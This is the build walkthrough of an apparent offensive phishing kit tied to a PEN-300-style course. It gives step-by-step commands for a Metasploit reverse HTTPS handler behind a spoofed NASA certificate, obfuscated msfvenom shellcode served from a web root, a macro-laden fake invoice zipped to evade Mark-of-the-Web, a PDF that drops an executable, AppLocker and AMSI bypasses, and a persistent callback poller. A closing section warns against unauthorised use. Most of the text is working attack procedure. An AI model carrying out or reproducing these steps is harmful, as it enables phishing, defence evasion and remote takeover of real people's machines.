# BUILD.md — End-to-End: Clone to Armed Payload

From fresh clone to two fully usable phishing payloads (`.docm` in an
encrypted zip, `.pdf`) with a working C2, tested against a lab target, and
ready for delivery.

Component-level notes live in each subdirectory. This file is the operator's
walkthrough.

---

## Hardened lab note

If your target is a PEN-300 challenge lab or any system with AppLocker,
LSA protection, or EDR, read [`HARDENED.md`](HARDENED.md) first. It has the
decision tree for which vector path to use and the pre-deployment checklist.

The kit is written for hardened labs. The DOC vector auto-detects whether
PowerShell is AppLocker-blocked and switches to the InstallUtil path
automatically. No manual branching at delivery.

---

## Prerequisites

### Kali C2

```bash
sudo apt install -y apache2 mono-devel p7zip-full pandoc python3
sudo systemctl start apache2
```

Metasploit assumed installed (Kali default).

### Windows dev box

- Windows 10/11 with Microsoft Word (2016+)
- .NET Framework 4.x (ships with Windows) — provides `csc.exe`
- Git Bash or WSL for bash helpers
- Lab VM for testing — **do not test on production**

### Network

Kali reachable from the lab VM on TCP 80 (web root) and TCP 443 (handler).

---

## Step 1 — C2 setup

### 1a. Web root

```bash
sudo mkdir -p /var/www/html
sudo chown -R www-data:www-data /var/www/html
sudo chmod 755 /var/www/html

cat > /var/www/html/decoy.html <<'HTML'
<!doctype html><html><head><title>IT Portal</title></head>
<body><h1>Document Portal</h1>
<p>Please contact IT support for access.</p></body></html>
HTML
```

### 1b. Handler

```bash
mkdir -p ~/self_cert && cd ~/self_cert
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key \
    -days 365 -subj "/C=US/ST=TX/L=Houston/O=NASA/OU=JSC/CN=nasa.gov"
cat priv.key cert.crt > nasa.pem
cd -

$EDITOR shared/handler.rc    # set LHOST, verify HandlerSSLCert path
msfconsole -q -r shared/handler.rc
```

Verify: `msf6 > jobs` shows the handler on 443.

---

## Step 2 — Generate `run.txt`

Template in `shared/run_txt_example.ps1`.

```bash
cd /tmp
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<KALI_IP> LPORT=443 \
    EXITFUNC=thread -f ps1 -o raw.txt

python3 - <<'PY'
import re
data = open('raw.txt').read()
nums = re.findall(r'0x([0-9a-fA-F]{2})', data)
enc  = [ (int(n,16) + 5) & 0xFF for n in nums ]
with open('ciphered.txt','w') as f:
    f.write('[Byte[]] $buf = ' + ','.join(f'0x{b:02x}' for b in enc))
PY
```

Copy `shared/run_txt_example.ps1` to `run.txt`, replace
`<CIPHERED_SHELLCODE_BYTES_HERE>` with `ciphered.txt` contents.

```bash
sudo cp run.txt /var/www/html/run.txt
sudo chmod 644 /var/www/html/run.txt
```

Verify: `http://<KALI_IP>/run.txt` returns the script.

---

## Step 3 — Prepare the DOC vector

### 3a. Encode the two PowerShell blobs

```bash
python3 tools/encode_poller.py shared/activate_poller.ps1
python3 tools/encode_poller.py shared/run_txt_launcher.ps1
# copy both single-line outputs
```

### 3b. Build the InstallUtil DLL

```bash
bash tools/build_dll.sh
# produces shared/Update.dll
```

Edit `shared/bypass_dll.cs` — replace `PASTE_BASE64_BLOB_HERE` in the `B64`
constant with the output of:
```bash
python3 tools/encode_poller.py shared/run_txt_launcher.ps1
```
Then re-run `bash tools/build_dll.sh`.

### 3c. Generate the docx body

```bash
cd doc
pandoc q4_invoice_body.md -o Q4_Invoice.docx
```

### 3d. Embed the macro

1. Open `Q4_Invoice.docx` in Word.
2. `Alt+F11` → Insert → Module.
3. Paste `doc/q4_invoice.vba` in full.
4. Replace:
   - `POLLER_B64` with the poller blob from 3a
   - `LAUNCHER_B64` with the launcher blob from 3a
   - Three occurrences of `http://192.168.119.120/run.txt` with your Kali IP
5. Save As → Word Macro-Enabled Document → `Q4_Invoice.docm`.
6. Close, reopen. Confirm the macro-warning banner and no error on Enable.

### 3e. Package

```bash
7z a -p"invoice2024" -mhe=on -tzip Q4_Invoice.zip Q4_Invoice.docm
```

---

## Step 4 — Prepare the PDF vector

### 4a. Encode the cradle

```bash
python3 tools/encode_cradle.py --kali <KALI_IP>
# copy the output into pdf/payload.cs
```

### 4b. Compile

```bash
cd pdf
csc /target:exe /platform:x64 /out:payload.exe payload.cs
# or: mcs -platform:x64 -out:payload.exe payload.cs
```

### 4c. Generate the PDF

Standard:
```bash
python3 build_pdf_payload.py --exe payload.exe --out Q4_Invoice.pdf
```

AppLocker-hardened target:
```bash
python3 build_pdf_payload.py --exe payload.exe --out Q4_Invoice.pdf \
    --cpath "C:\\ProgramData\\Microsoft\\"
```

---

## Step 5 — Test on lab VM

**Both vectors, before delivery.**

### 5a. DOC vector

1. Copy `Q4_Invoice.zip` to lab VM, extract with 7-Zip (`invoice2024`).
2. Confirm the extracted `.docm` has no MoTW (Properties → Security empty).
3. Open in Word → click **Enable Content**.
4. Handler should catch a session within ~30 seconds.

If no session:
- `sudo tail -f /var/log/apache2/access.log` — did the VM hit `/run.txt`?
- Check Defender history
- If the lab is AppLocker-hardened, confirm `Update.dll` was staged at
  `%PROGRAMDATA%\Microsoft\Update.dll` before the .docm was opened

### 5b. PDF vector

1. Copy `Q4_Invoice.pdf` to lab VM.
2. Open in **Adobe Reader** (not Edge/Chrome).
3. Confirm "Loading invoice viewer..." alert.
4. Confirm "Open attachment?" prompt.
5. Click **Open**. Handler should catch a session.

### 5c. Persistence and callback

1. Reboot, log in.
2. Wait 5–10 min (poller runs every 5 min but does nothing without
   `/activate`).
3. From Kali: `sudo touch /var/www/html/activate`.
4. Session should open within 5 minutes.
5. `sudo rm /var/www/html/activate` — no further sessions.

### 5d. Confirm the gate

With no `/activate` present, watch the handler for 10 minutes. Nothing
should fire.

---

## Step 6 — Operator workflow

```bash
# Handler running (Step 1b)
# Delivery via either vector
# When session opens:
sessions -l
sessions -i <n>
background

# Re-establish later:
sudo touch /var/www/html/activate
# wait, catch session
sudo rm /var/www/html/activate

# Before close:
sessions -i <n>
shell
powershell -exec bypass -File shared/cleanup.ps1
exit
```

---

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| Word blocks macro, no Enable | Office 2021/365 policy | Use PDF vector |
| `.docm` in Protected View | MoTW through zip | Re-zip with `7z -mhe=on` |
| PDF opens in browser, no JS | Chrome/Edge/Firefox viewer | Set Adobe Reader default |
| No session after Enable Content | Cradle failed | Check Apache log for `/run.txt` hit |
| No session from PDF | Defender caught `payload.exe` | Check history; use `--cpath` or InstallUtil DOC path |
| Handler catches then dies | Stage encoding or EXITFUNC | Confirm `EXITFUNC=thread` and `EnableStageEncoding true` |
| `/activate` fires no session | AMSI bypass failed | Test manually with AMSI disabled; swap bypass |
| `csc` not found | PATH missing | Add `C:\Windows\Microsoft.NET\Framework64\v4.0.30319` to PATH |
| InstallUtil path never taken | PowerShell actually works on target | Expected — Path A is preferred. Path B is fallback only |
| InstallUtil completes no session | DLL not staged or B64 mismatch | Confirm `Update.dll` at `%PROGRAMDATA%\Microsoft\` and B64 regenerated |

---

## What NOT to do

- Do not test against systems you do not own or have written authorization
  for. Every command here is one step from a crime in most jurisdictions.
- Do not commit compiled artifacts. `.gitignore` blocks them.
- Do not reuse certificates, cradles, or cipher keys across engagements.
- Do not leave `/activate` on the C2 after an engagement.

---

## Course cross-reference

| Technique | Module |
|-----------|--------|
| AMSI bypass (context corruption) | 12.3.1 |
| AMSI bypass (amsiInitFailed) | 12.3.2 |
| Office macro phishing | 4.1.2 |
| De-chaining via WMI | 11.8.2 |
| Emulator detection | 11.6.1 |
| Non-emulated API check | 11.6.2 |
| Ciphered shellcode | 11.5.2 |
| Reflective shellcode runner | 8.2.3 |
| InstallUtil AppLocker bypass | 13.3.3 |
| DLL sideloading (fallback) | 6.1 |
| Certificate signing | 14.3.1 |
| Stage encoding | 11.4.1 |
| Domain fronting (egress) | 14.6 |
| LSASS dump with mimidrv | 17.3.2 |
